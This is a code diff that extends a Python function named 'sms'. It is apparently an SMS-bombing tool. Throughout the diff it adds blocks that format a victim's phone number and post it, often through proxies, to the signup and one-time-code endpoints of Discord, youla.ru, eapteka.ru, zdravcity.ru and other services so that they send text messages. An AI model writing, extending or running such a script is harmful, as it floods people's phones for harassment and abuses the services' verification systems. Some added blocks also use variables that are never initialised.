@@ -215,6 +215,29 @@ def sms(prx, number, tm, code):
 					pass
 
 				try:
+					num = number
+
+					num2+=num[1]
+					num2+=num[2]
+					num2+=num[3]
+
+					num3+=num[4]
+					num3+=num[5]
+					num3+=num[6]
+
+					num4+=num[7]
+					num4+=num[8]
+
+					num5+=num[9]
+					num5+=num[10]
+					payload = {
+						"phone": f"+ {code} ( {num2} ) {num3}-{num4}-{num5}"
+					}
+					requests.post("https://discord.com/api/v9/users/@me/phone", data = payload, proxies = proxies)
+				except:
+					pass
+
+				try:
 					payload = {
 						"client_id": "broker_otp_guest2",
 						"grant_type": "password",
@@ -298,8 +321,41 @@ def sms(prx, number, tm, code):
 					pass
 
 				try:
+					payload = {"password":"","login":number}
+					requests.post("https://loymax.ivoin.ru/publicapi/v1.2/Registration/BeginRegistration", json=payload, proxies=proxies)
+				except:
+					pass
+
+				try:
 					payload = {"phone": number[1:]}
 					requests.post("https://backend.academyopen.ru/api-7/otp-code/send", json=payload, proxies=proxies)
+				except:
+					pass
+
+				try:
+					num = number
+					num2=""
+					num2+="+"
+					num2+=code
+					num2+="("
+					num2+=num[1]
+					num2+=num[2]
+					num2+=num[3]
+					num2+=")"
+					num2+=num[4]
+					num2+=num[5]
+					num2+=num[6]
+					num2+="-"
+					num2+=num[7]
+					num2+=num[8]
+					num2+="-"
+					num2+=num[9]
+					num2+=num[10]
+					payload = {
+						"phone": num2,
+						"register": "true"
+					}
+					requests.post("https://airsoft-rus.ru/bitrix/components/bxmt/phone/sms.php", data=payload, proxies=proxies)
 				except:
 					pass
 
@@ -319,8 +375,57 @@ def sms(prx, number, tm, code):
 					pass
 
 				try:
+					num = number
+					num2=""
+					num2+="+"
+					num2+=code
+					num2+=' '
+					num2+="("
+					num2+=num[1]
+					num2+=num[2]
+					num2+=num[3]
+					num2+=")"
+					num2+=' '
+					num2+=num[4]
+					num2+=num[5]
+					num2+=num[6]
+					num2+='-'
+					num2+=num[7]
+					num2+=num[8]
+					num2+='-'
+					num2+=num[9]
+					num2+=num[10]
+					payload = {"phone":num2,"force_sms":"true"}
+					requests.post("https://api.eapteka.ru/api/v3/user", json=payload, proxies=proxies)
+				except:
+					pass
+
+				try:
 					payload = {"phone": number, "action": "register"}
 					requests.post("https://cnt-lbrc-itv02.svc.iptv.rt.ru/api/v2/portal/send_sms_code", json=payload, proxies=proxies)
+				except:
+					pass
+
+				try:
+					payload = {
+						"phone": number[1:],
+						"bxsid": "c077215a7749df2949ed967377de77ca",
+						"sms1": "Y",
+						"typeAction": "regUser"
+					}
+					requests.post("https://zdravcity.ru/ajax/sendcode.php", data=payload, proxies=proxies)
+				except:
+					pass
+
+				try:
+					payload = {"phone": "+"+number}
+					requests.post("https://youla.ru/web-api/auth/request_code", data=payload, proxies=proxies)
+				except:
+					pass
+
+				try:
+					payload = {"phone": number}
+					requests.post("https://b-apteka.ru/lk/send_confirm_code", json=payload, proxies=proxies)
 				except:
 					pass
 
@@ -457,6 +562,12 @@ def sms(prx, number, tm, code):
 					pass
 
 				try:
+					payload = {"phone": "+"+number}
+					requests.post("https://youla.ru/web-api/auth/request_code", data=payload)
+				except:
+					pass
+
+				try:
 					payload = {
 						"CountryCodeNumber": "+" + number[1:], 
 						"IsoCountryCode": "RU", 
@@ -467,7 +578,73 @@ def sms(prx, number, tm, code):
 					pass
 
 				try:
+					payload = {"phone": number}
+					requests.post("https://b-apteka.ru/lk/send_confirm_code", json=payload)
+				except:
+					pass
+
+				try:
+					num = number
+					num2=""
+					num2+="+"
+					num2+=code
+					num2+=' '
+					num2+="("
+					num2+=num[1]
+					num2+=num[2]
+					num2+=num[3]
+					num2+=")"
+					num2+=' '
+					num2+=num[4]
+					num2+=num[5]
+					num2+=num[6]
+					num2+='-'
+					num2+=num[7]
+					num2+=num[8]
+					num2+='-'
+					num2+=num[9]
+					num2+=num[10]
+					payload = {"phone":num2,"force_sms":"true"}
+					requests.post("https://api.eapteka.ru/api/v3/user", json=payload)
+				except:
+					pass
+
+				try:
 					requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": '+'+number}, headers = header)
+				except:
+					pass
+
+				try:
+					num = number
+
+					num2+=num[1]
+					num2+=num[2]
+					num2+=num[3]
+
+					num3+=num[4]
+					num3+=num[5]
+					num3+=num[6]
+
+					num4+=num[7]
+					num4+=num[8]
+
+					num5+=num[9]
+					num5+=num[10]
+					payload = {
+						"phone": f"+ {code} ( {num2} ) {num3}-{num4}-{num5}"
+					}
+					requests.post("https://discord.com/api/v9/users/@me/phone", data = payload)
+				except:
+					pass
+
+				try:
+					payload = {
+						"phone": number[1:],
+						"bxsid": "c077215a7749df2949ed967377de77ca",
+						"sms1": "Y",
+						"typeAction": "regUser"
+					}
+					requests.post("https://zdravcity.ru/ajax/sendcode.php", data=payload)
 				except:
 					pass
 
@@ -572,6 +749,39 @@ def sms(prx, number, tm, code):
 				try:
 					payload = {"request":{"login":number},"request_id":75291684,"application_id":13,"rabota_ru_id":"61e37b73739641004915965152223419","user_tags":[{"id":0,"add_date":"2022-01-16","name":"hr_banners_show"},{"id":0,"add_date":"2022-01-16","name":"web_premium_target"},{"id":0,"add_date":"2022-01-16","name":"courses_widget_target"},{"id":0,"add_date":"2022-01-16","name":"search_exclude_reloc2_target"},{"id":0,"add_date":"2022-01-16","name":"web_search_all_regions2_target1"},{"id":0,"add_date":"2022-01-16","name":"profession_widget_target"},{"id":0,"add_date":"2022-01-16","name":"search_query_profession_tags_control2"},{"id":0,"add_date":"2022-01-16","name":"hr_new_scheduled_action_list_active"}]}
 					requests.post("https://spb.rabota.ru/api-web/v6/code/send.json", json=payload)
+				except:
+					pass
+
+				try:
+					num = number
+					num2=""
+					num2+="+"
+					num2+=code
+					num2+="("
+					num2+=num[1]
+					num2+=num[2]
+					num2+=num[3]
+					num2+=")"
+					num2+=num[4]
+					num2+=num[5]
+					num2+=num[6]
+					num2+="-"
+					num2+=num[7]
+					num2+=num[8]
+					num2+="-"
+					num2+=num[9]
+					num2+=num[10]
+					payload = {
+						"phone": num2,
+						"register": "true"
+					}
+					requests.post("https://airsoft-rus.ru/bitrix/components/bxmt/phone/sms.php", data=payload)
+				except:
+					pass
+
+				try:
+					payload = {"password":"","login":number}
+					requests.post("https://loymax.ivoin.ru/publicapi/v1.2/Registration/BeginRegistration", json=payload)
 				except:
 					pass
 
